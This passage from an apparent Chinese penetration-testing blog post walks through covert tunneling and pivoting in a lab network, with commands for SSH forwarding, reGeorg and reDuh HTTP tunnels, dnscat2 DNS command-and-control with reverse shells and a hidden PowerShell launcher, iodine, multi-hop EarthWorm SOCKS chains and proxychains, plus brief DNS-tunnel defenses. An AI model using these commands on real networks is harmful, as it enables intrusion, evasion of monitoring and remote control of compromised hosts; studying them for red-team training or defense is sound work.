+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3307:172.16.1.10:3389 root@172.16.1.7       web服务器执行，远程转发</span><br><span class="line">接下来需要输入攻击端172.16.1.7的密码 </span><br><span class="line">netstat -tulnp | grep &quot;3307&quot;             查看端口开启成功没 </span><br><span class="line">rdesktop 127.0.0.1:3307</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222434.png"></p>
+<p>模拟环境：远程攻击端只可以访问web服务器172.16.1.5（双IP），以web服务器为跳板。动态端口映射就是建立一个SSH加密的SOCKS4&#x2F;5代理，任何支持这个协议的程序都可以使用这个加密通道。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7000 root@172.16.1.5      攻击端执行    动态转发 </span><br><span class="line">接下来需要输入攻击端172.16.1.5的密码 </span><br><span class="line">netstat -tulnp | grep &quot;7000&quot;        查看端口开启成功没 </span><br><span class="line">随后在攻击端本地设置代理127.0.0.1:7000</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222535.png"></p>
+<h2 id="HTTP-x2F-HTTPS协议：reGeorg-代理"><a href="#HTTP-x2F-HTTPS协议：reGeorg-代理" class="headerlink" title="HTTP&#x2F;HTTPS协议：reGeorg-代理"></a><strong>HTTP&#x2F;HTTPS协议：reGeorg-代理</strong></h2><p>把内网服务器的端口通过http或https隧道转发到本机，形成TCP连通回路。reDuh和lcx不同的地方就是reDuh不需要本地电脑拥有外网IP。包括reGeorg、reduh等工具。</p>
+<p>reGeorg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://172.16.1.12:8085/tunnel.apsx -p 999 </span><br><span class="line">端口已经架设好，可以使用proxychains等代理工具，爆破3389</span><br></pre></td></tr></table></figure>
+
+<p>reduh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar reDuhClient.jar http://172.16.1.8:81/practice/reDuh.php      本地客户端连接服务端 </span><br><span class="line">nc -vv 127.0.0.1 1010                                 在本地用NC连接1010管理端口 </span><br><span class="line">[createTunnel]1234:目标IP:3389              在管理端口输入命令转发本地端口流量到远程目标端口</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222911.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222922.png"></p>
+<h2 id="DNS协议：dnscat2-反弹shell"><a href="#DNS协议：dnscat2-反弹shell" class="headerlink" title="DNS协议：dnscat2-反弹shell"></a><strong>DNS协议：dnscat2-反弹shell</strong></h2><p>防火墙、IDS通常不会过滤DNS流量，DNS隧道通常被利用在APT攻击中。（C&amp;C通信）</p>
+<p>包括dnscat2、iodine等工具。</p>
+<p><strong>工作原理</strong></p>
+<p>在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果（实际上可以返回IP地址或者任意字符串 -&gt; C&amp;C），简单的说就是将其他协议封装在DNS协议中传输，表面上看是没有接通外网的（内网网关没有转发IP数据包），实际上是内网的DNS服务器进行了中转操作。</p>
+<p><strong>TIPS</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A记录：通俗来说就是服务器的IP </span><br><span class="line">MX记录：邮件路由记录，指向一个邮件服务器 </span><br><span class="line">CNAME记录：将域名指向一个域名，实现与被指向域名相同的访问效果 </span><br><span class="line">TXT记录：可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录 </span><br><span class="line">AAAA记录：将主机名（或域名）指向一个IPv6地址 </span><br><span class="line">NS记录：指定子域名由哪个DNS服务器解析 </span><br><span class="line">PTR记录：目标邮箱服务器会查询来源邮件的头文件，进行反向域名解析，看解析结果是否能和发件人对应 </span><br><span class="line">SPF记录：存放服务器授权IP，邮件接收方会根据SPF记录判断来源IP是否正确，得知邮件是否是伪造的</span><br></pre></td></tr></table></figure>
+
+<p><strong>工作流程</strong></p>
+<ul>
+<li>假设域名为a.qqq.com的主机想知道另一个主机b.sss.com的IP地址。</li>
+<li>主机查找本地计算机缓存，没找见。 </li>
+<li>主机向本地域名服务器（本机TCP&#x2F;IP参数中设置的值）dns.qqq.com进行递归查询，没找见。 </li>
+<li>本地域名服务器向一个根域名服务器进行迭代查询，返回下一次应查询的顶级域名服务器dns.com的IP地址。 </li>
+<li>本地域名服务器向顶级域名服务器dns.com进行查询，返回下一步应查询的权限服务器dns.sss.com的IP地址。 </li>
+<li>本地域名服务器向权限域名服务器dns.sss.com进行查询，返回所查询的主机的IP地址。 </li>
+<li>本地域名服务器最后把查询结果告诉a.qqq.com。 </li>
+<li>最后本地计算机、本地域名服务器更新缓存表，方便以后查询。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf|grep -v &#x27;#&#x27; 查询内部域名和域名服务器地址</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209224246.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup holy.testA      查看能否与内部DNS通信，解析内部域名 </span><br><span class="line">nslookup baidu.com       查看能否通过内部DNS解析外部域名</span><br></pre></td></tr></table></figure>
+
+<p>能解析外部域名意味着可以使用DNS隧道实现隐蔽通信。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209224254.png"></p>
+<p><strong>dnscat2</strong></p>
+<p>使用dns协议创建加密的C&amp;C通道，基于53端口，通过预共享密钥进行身份验证，更加隐蔽，有服务端和客户端，所有的指令都可以在该控制台内完成。包括：文件上传、下载、反弹Shell。</p>
+<p>exe：<a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip</a></p>
+<p>ps：<a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p>
+<p><strong>Tips</strong></p>
+<ul>
+<li>DNS解析的类型：常见的有：A、CNAME、MX、TXT、AAAA（ 默认是TXT、CNAME、MX随机混合使用）。</li>
+<li>直连模式：客户端直接向指定IP的恶意DNS服务器发起DNS解析请求，不通过DNS服务商。</li>
+<li>中继模式：DNS解析先经过互联网的迭代解析，最后指向恶意DNS服务器。相比直连，速度较慢，但是更安全。</li>
+</ul>
+<p>（如果没有购买域名，还可以在UDP&#x2F;53上使用直连，会更快，但它在数据包中更明显（所有域名都以dnscat为前缀）。防火墙经常会阻止此模式）</p>
+<p><strong>安装</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ruby环境 </span><br><span class="line">apt-get install gem </span><br><span class="line">apt-get install ruby-dev </span><br><span class="line">apt-get install libpq-dev </span><br><span class="line">apt-get install ruby-bundler </span><br><span class="line">服务端 </span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git </span><br><span class="line">cd dnscat2/server/ </span><br><span class="line">gem install bundler </span><br><span class="line">bundle install </span><br><span class="line">客户端 </span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git </span><br><span class="line">cd dnscat2/client/ </span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p><strong>连接</strong></p>
+<p>服务端 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb --secret=123456 --no-cache          直连 </span><br><span class="line">ruby ./dnscat2.rb domain -e open -c 123456 --no-cache          中继 </span><br></pre></td></tr></table></figure>
+
+<p>客户端 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --ping domain             测试是否连通 </span><br><span class="line">./dnscat --dns server=172.16.1.6,port=53 --secret=123456              直连 </span><br><span class="line">dnscat2-v0.07-client-win32.exe --dns domain=xxxxx --secret 123456     中继</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209224815.png"></p>
+<p><strong>反弹shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window or session           查看客户端在线情况 </span><br><span class="line">window -i 编号 or session -i 编号         选定客户端 </span><br><span class="line">shell      创建交互式shell，是另一个会话 </span><br><span class="line">ctrl+z      返回到选客户端界面 </span><br><span class="line">window -i         往下选一个编号打开shell</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209224938.png"></p>
+<p><strong>powershell版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端执行（可远程加载） </span><br><span class="line">powershell -nop -w hidden -c &quot;&amp; &#123;Import-Module .\dnscat2.ps1; Start-Dnscat2 -Domain domain -DNSServer IP&#125;&quot; </span><br><span class="line">exec psh        创建新shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>iodine</strong></p>
+<p>IPv4的数据通道，分直连和中继，连接时服务端和客户端都会建立虚拟网卡。服务端程序提供特定域名的DNS解析服务，当客户端请求该域名的解析，就可以建立通道连接，两者通过DNS隧道，同处于一个局域网（即两张虚拟网卡IP会在同一个局域网）。</p>
+<p><strong>安装</strong></p>
+<p>apt-get install（kali自带）。</p>
+<p><strong>连接</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iodined -P 123456 -f -DD 192.168.0.1 abc.com          服务端 </span><br><span class="line">iodine -P 123456 -f -r &lt;your iodine server ip&gt; abc.com     客户端</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御dns隧道攻击方法</strong></p>
+<ul>
+<li>只允许由内向外与受信任的DNS服务器通信。 </li>
+<li>注意流量中的TXT请求。 </li>
+<li>跟踪用户的DNS查询次数 。</li>
+<li>禁止ICMP。</li>
+</ul>
+<h2 id="SOCKS代理：EarthWorm-代理-端口转发"><a href="#SOCKS代理：EarthWorm-代理-端口转发" class="headerlink" title="SOCKS代理：EarthWorm-代理+端口转发"></a><strong>SOCKS代理：EarthWorm-代理+端口转发</strong></h2><p>一种代理服务，支持多种协议，包括HTTP、FTP等；避免多次端口转发，可以理解为增强版的lcx，可以应对之前提过的三种网络情况。包括EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、ProxyChains等工具。</p>
+<ul>
+<li>SOCKS 4：支持TCP。 </li>
+<li>SOCKS 5：支持TCP&#x2F;UDP，还有各种身份验证机制，标准端口为1080。</li>
+</ul>
+<p><strong>EarthWorm</strong></p>
+<p>在服务端监听一个服务端口，当有新的连接请求时会从SOCKS协议中解析出访问目标URL的目标端口，再开始执行lcx的具体功能。共有 6 种命令格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssocksd 正向代理，适用于目标拥有外网IP </span><br><span class="line">rcsocks 反向代理，适用于目标可访问外网 </span><br><span class="line">rssocks </span><br><span class="line">lcx_slave      端口转发、多级级联 </span><br><span class="line">lcx_listen </span><br><span class="line">lcx_tran</span><br></pre></td></tr></table></figure>
+
+<p>正向代理。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 888                 开启SOCKS5服务 </span><br><span class="line">使用代理软件设置全局代理：目标IP:888</span><br></pre></td></tr></table></figure>
+
+<p>反向代理。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 8888       在外网IP上添加一个转接隧道，把1080端口收到的代理请求转交给反连8888端口的主机，其中rcsocks可以用lcx_listen代替 </span><br><span class="line">ew -s rssocks -d 外网IP -e 8888 在目标机器上启动SOCKS5服务，反弹到外网IP的8888端口上</span><br><span class="line">使用代理软件设置全局代理：外网IP:8888</span><br></pre></td></tr></table></figure>
+
+<p>二级网络环境1：正向+端口映射。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X（1.1.1.1、10.10.10.10）：内网主机，两块网卡，一块可访问外网，有外网IP（防火墙分配，不同于整个内网的出口IP），另一块可访问Y，无法访问其他内网资源 </span><br><span class="line">Y（1.1.1.2）：目标，内部主机，可访问内网资源，无法访问外网</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocked -l 888         在Y中执行，开启SOCKS5正向代理 </span><br><span class="line">ew -s lcx_tran -l 1080 -f 1.1.1.2 -g 888 在X中执行将本机1080端口收到的请求映射给Y的888端口 </span><br><span class="line">使用代理软件设置全局代理：10.10.10.10:1080</span><br></pre></td></tr></table></figure>
+
+<p>二级网络环境2：正向+反向+端口转发。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X（1.1.1.1）：内网主机，无外网IP，可访问外网和Y，无法访问其他内网资源 </span><br><span class="line">Y（1.1.1.2）：目标，内部主机，可访问内网资源，无法访问外网 </span><br><span class="line">外网IP：2.2.2.2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 1080 -e 8888     在外网主机上添加转接隧道，将1080端口收到的代理请求转交给反连8888端口的主机 </span><br><span class="line">ew -s ssocksd -l 9999 在Y中运行，开启SOCKS5正向代理 </span><br><span class="line">ew -s lcx_slave -d 2.2.2.2 -e 8888 -f 1.1.1.2 -g 9999 在X中运行，将Y主机的9999端口和外网主机的8888端口连接 </span><br><span class="line">使用代理软件设置全局代理：2.2.2.2:1080</span><br></pre></td></tr></table></figure>
+
+<p>三级网络环境：正向+反向+端口转发。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X（1.1.1.1）：内网主机，无外网ip，可访问外网和Y，无法访问其他内网资源 </span><br><span class="line">Y（1.1.1.2）：内网主机，可访问Z，无法访问外网 </span><br><span class="line">Z（1.1.1.3）：目标，内部主机，可访问内网资源，无法访问外网 </span><br><span class="line">外网IP：2.2.2.2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 8888       在外网主机上添加转接隧道，将1080端口收到的代理请求转交给反连8888端口的主机 </span><br><span class="line">ew -s lcx_slave -d 2.2.2.2 -e 8888 -f 1.1.1.2 -g 9999       在X中运行，将Y主机的9999端口转发到公网主机的8888端口上 </span><br><span class="line">ew -s lcx_listen -l 9999 -e 7777       在Y主机上添加转接隧道，将9999端口收到的代理请求转交给反连7777端口的主机 </span><br><span class="line">ew -s rssocks -d 1.1.1.2 -e 7777       在Z主机上开启SOCKS5代理并反向连接到Y主机的7777端口 </span><br><span class="line">使用代理软件设置全局代理：2.2.2.2:1080 </span><br><span class="line">数据流向为1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</span><br></pre></td></tr></table></figure>
+
+<p><strong>SocksCap64：win全局代理</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209230249.png"></p>
+<p><strong>ProxyChains：linux全局代理</strong></p>
+<ol>
+<li><p>vi &#x2F;etc&#x2F;proxychains.conf，删除dynamic_chain前的注释符。</p>
+</li>
+<li><p>在ProxyList处添加代理配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209230402.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxyresolv www.baidu.com     测试代理是否架设成功 </span><br><span class="line">cp /usr/lib/proxychains3/proxyresolv /usr/bin/     未找到命令则执行 </span><br><span class="line">proxychains rdesktop 目标:3389 </span><br><span class="line">proxychains firefox </span><br><span class="line">proxychains nmap </span><br><span class="line">proxychains sqlmap</span><br></pre></td></tr></table></figure>
+
+<p>ps：proxychains不支持udp和icmp协议，所以使用nmap要加上-sT -Pn，不能用-T4和-A。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209230410.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">V3teran</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://v3teran.github.io/2021/02/09/%E5%90%84%E7%A7%8D%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/">https://v3teran.github.io/2021/02/09/各种通信隧道/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://V3teran.github.io" target="_blank">V3teran's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%90%86/">代理</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BC%B9Shell/">反弹Shell</a><a class="post-meta__tags" href="/tags/%E7%AB%AF%E5%8F%A3/">端口</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194231.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/08/SPN%E5%92%8CKerberoast%E6%94%BB%E5%87%BB/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194338.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SPN和Kerberoast攻击</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/10/XSS%E5%B9%B3%E5%8F%B0GPS%E5%AE%9A%E4%BD%8D/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194041.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XSS平台GPS定位</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/12/15/C2%E9%9A%90%E8%97%8F/" title="C2隐藏"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/post/202112152046977.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-15</div><div class="title">C2隐藏</div></div></a></div><div><a href="/2021/02/19/SSRF/" title="SSRF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218152951.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-19</div><div class="title">SSRF</div></div></a></div><div><a href="/2021/02/15/Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%86%99Shell%E7%9A%84%E5%9D%91/" title="Ubuntu计划任务写Shell的坑"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218111944.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-15</div><div class="title">Ubuntu计划任务写Shell的坑</div></div></a></div><div><a href="/2021/02/07/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/" title="端口渗透总结"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194504.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-07</div><div class="title">端口渗透总结</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IPV6%E9%9A%A7%E9%81%93"><span class="toc-number">2.</span> <span class="toc-text">IPV6隧道</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">3.</span> <span class="toc-text">ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PingTunnel-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">3.1.</span> <span class="toc-text">PingTunnel-端口转发</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93"><span class="toc-number">4.</span> <span class="toc-text">传输层隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lcx-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.</span> <span class="toc-text">lcx-端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc-%E5%8F%8D%E5%BC%B9shell-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.2.</span> <span class="toc-text">nc-反弹shell-端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerCat-%E5%8F%8D%E5%BC%B9shell-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.3.</span> <span class="toc-text">PowerCat-反弹shell-端口转发</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93"><span class="toc-number">5.</span> <span class="toc-text">应用层隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E5%8D%8F%E8%AE%AE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E4%BB%A3%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">ssh协议 - 端口转发-代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-x2F-HTTPS%E5%8D%8F%E8%AE%AE%EF%BC%9AreGeorg-%E4%BB%A3%E7%90%86"><span class="toc-number">5.2.</span> <span class="toc-text">HTTP&#x2F;HTTPS协议：reGeorg-代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%8D%8F%E8%AE%AE%EF%BC%9Adnscat2-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.3.</span> <span class="toc-text">DNS协议：dnscat2-反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOCKS%E4%BB%A3%E7%90%86%EF%BC%9AEarthWorm-%E4%BB%A3%E7%90%86-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">5.4.</span> <span class="toc-text">SOCKS代理：EarthWorm-代理+端口转发</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 <i style="color:#FF6A6A;animation: announ_animation 0.8s linear infinite;" class="fa fa-heartbeat"></i> V3teran</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  